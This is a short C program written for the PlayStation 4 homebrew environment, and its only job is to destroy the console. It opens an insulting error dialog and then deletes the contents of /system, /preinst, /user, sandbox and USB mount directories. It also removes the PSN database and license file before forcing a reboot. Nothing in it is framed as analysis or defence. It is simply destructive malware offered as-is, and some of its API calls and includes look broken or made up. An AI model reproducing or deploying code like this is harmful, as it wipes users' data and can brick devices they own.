#include <stdio.h>
#include <stdlib.h>
#include <orbis/libkernel.h>
#include <orbis/SystemService.h>
#include <orbis/AppInstUtil.h>
#include <orbis/UserService.h>
#include <orbis/Dialog.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>

void wipe_directory(const char *path) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    char filepath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
        remove(filepath);
    }
    closedir(dir);
    rmdir(path);
}

void destroy_ps4() {
    OrbisDialogParam params;
    orbisDialogParamInitialize(&params);
    params.msg = "your playstation 4 was been fucked";
    params.type = ORBIS_DIALOG_TYPE_ERROR;
    orbisDialogInitialize();
    orbisDialogOpen(&params);

    sleep(3);

    wipe_directory("/system");
    wipe_directory("/preinst");
    wipe_directory("/user");
    wipe_directory("/mnt/sandbox");
    wipe_directory("/mnt/usb0");
    wipe_directory("/mnt/usb1");

    remove("/system/priv/psn.db");
    remove("/system/priv/license.dat");

    sceKernelReboot(1);
}

int main() {
    destroy_ps4();
    return 0;
}
